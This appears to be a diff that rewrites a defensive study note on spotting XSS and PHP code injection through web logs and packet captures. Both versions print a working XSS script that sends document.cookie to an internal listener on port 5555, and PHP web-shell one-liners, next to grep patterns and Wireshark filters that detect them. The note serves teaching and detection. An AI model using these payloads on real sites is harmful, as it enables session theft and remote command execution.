@@ -1,110 +1,111 @@
-## Cross-Site Scripting (XSS) & Code Injection Detection
+## Detecting XSS and Code Injection in Web Traffic
 
-### 1. Understanding Cross-Site Scripting (XSS)
-
-Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into a trusted website. Unlike many other attacks that target the server directly, XSS primarily targets the **users** of the website.
-
-The website acts as a **delivery vehicle** for the attack. Because the script comes from a site the user trusts, the browser has no way to know the script is malicious and will execute it. This allows attackers to bypass the Same-Origin Policy and may enable them to:
-
-- Read cookies or local/session storage
-- Capture keystrokes
-- Steal session tokens
-- Redirect the user to a phishing or malicious site
+This note explains, in my own words, how to recognize both client‑side (XSS) and server‑side code injection using logs and PCAPs.
 
 ---
 
-### 2. Scenario: Suspicious Internal Traffic
+### 1. Cross-Site Scripting in Practice
 
-If you notice that a significant number of requests are being sent to an internal server that you do not recognize, this may indicate the presence of **cross-site scripting** or other client-side injection.
+With Cross‑Site Scripting (XSS), the attacker’s goal is to get **the victim’s browser** to run malicious JavaScript that came from a trusted site.
+
+Because the script is served from your domain:
+
+- The browser happily sends **cookies, localStorage, and session data**.  
+- The script can read and exfiltrate that data.  
+- The Same‑Origin Policy works **for** the attacker instead of against them.
+
+The site becomes the delivery vehicle for stealing user data or driving them to phishing pages.
 
 ---
 
-### 3. Types of Injection
+### 2. Example Scenario: Weird Internal HTTP Traffic
 
-#### 3.1 Client-Side Injection (XSS)
+If you suddenly see browsers inside your network sending repeated requests to an unfamiliar internal host or odd port, that can be a sign that:
 
-Attackers commonly use XSS to steal tokens, cookies, and other session values. For example, if the injection is placed in a comment field, the injected payload might look like:
+- A page has an injected `<script>` tag.  
+- The script is beaconing or exfiltrating data in the background.
+
+---
+
+### 3. Injection Styles
+
+#### 3.1 Browser-Side (XSS)
+
+An attacker posting a malicious comment or parameter might inject a script like:
 
 ```html
 <script>
   window.addEventListener("load", function() {
     const url = "http://192.168.0.19:5555";
     const params = "cookie=" + encodeURIComponent(document.cookie);
-    const request = new XMLHttpRequest();
-    request.open("GET", url + "?" + params);
-    request.send();
+    const req = new XMLHttpRequest();
+    req.open("GET", url + "?" + params);
+    req.send();
   });
 </script>
 ```
 
-This script:
+Behaviour:
 
-- Waits for the page to load.
-- Reads `document.cookie`.
-- Sends the cookie contents to `192.168.0.19` over port `5555`.
+- Runs automatically when the page loads.  
+- Reads `document.cookie`.  
+- Sends it to an attacker‑controlled listener on port `5555`.
 
-#### 3.2 Server-Side Injection (PHP)
+#### 3.2 Server-Side Code Injection (Example: PHP)
 
-Attackers may also attempt to inject **server-side** code, such as PHP, to gain direct control over the web server and achieve Remote Code Execution (RCE).
-
-Examples:
+On the backend, unsafe dynamic code constructs allow remote command execution, such as:
 
 ```php
 <?php system($_GET['cmd']); ?>
 ```
 
-- **Purpose**: Command and Control (C2)
-- Effect: The attacker can run arbitrary system commands by supplying `?cmd=<command>` in the URL.
+or:
 
 ```php
 <?php echo shell_exec('whoami'); ?>
 ```
 
-- **Purpose**: Information gathering
-- Effect: Reveals which user account the web server is running under.
+The first acts as a crude C2 interface (`?cmd=`). The second leaks system identity.
 
 ---
 
-### 4. How to Detect These Attacks
+### 4. Detection Approach
 
-Detection requires looking at both:
+You need to look at both **incoming** requests and **outgoing** callbacks.
 
-- The **Inbound request** (the injection itself)
-- The **Outbound behavior** (data exfiltration or callbacks)
+#### 4.1 Catching the Malicious Input
 
-#### 4.1 Detecting the Injection (Inbound)
+- **In web logs**
 
-- **Log Analysis**
-  - Search web access logs for suspicious patterns such as `<script>` tags or dangerous functions like `system(`, `eval(`, or `whoami`.
+  Search for HTML/JS or dangerous PHP functions in URLs or parameters:
 
   ```bash
   grep -E "(<script|system\(|eval\(|whoami)" access.log
   ```
 
-- **Wireshark Inspection**
-  - Look for suspicious characters in HTTP URIs or POST bodies that indicate HTML/JS or PHP injection.
+- **In PCAPs**
 
-  Example filter:
+  Look for suspicious content in URIs or POST bodies, for example:
 
   ```text
   http.request.uri contains "<script>" or http.request.uri contains "php"
   ```
 
-#### 4.2 Detecting the Impact (Outbound)
+#### 4.2 Catching the Exfil or Callback
 
-- **Unusual Destinations**
-  - Look for HTTP requests **originating from your network** (or users) going to unknown IP addresses or strange ports, such as port `5555`.
+- **Strange destinations**  
+  Browsers calling out to odd IPs or uncommon ports (like `:5555`) instead of only your normal domains.
 
-- **Data in URLs**
-  - In Wireshark, inspect GET parameters that look like encoded cookies or session IDs.
-
-  Example filter:
+- **Giveaway query parameters**  
+  GET requests where parameters look like encoded cookies or full session tokens, e.g.:
 
   ```text
   http.request.uri contains "cookie=" or http.request.uri contains "session="
   ```
 
-- **Referer Header**
-  - If a user’s browser is sending data out to an attacker’s server, the `Referer` header of that outbound request will often point back to your own website, revealing the original compromised page.
+- **Telltale Referer**  
+  If the outbound request’s `Referer` header points back to a specific page on your site, that page is likely where the injection lives.
+
+Putting all three together (payload in request, weird destination, useful Referer) gives a strong story for an XSS or code‑injection‑driven exfiltration.
 
 
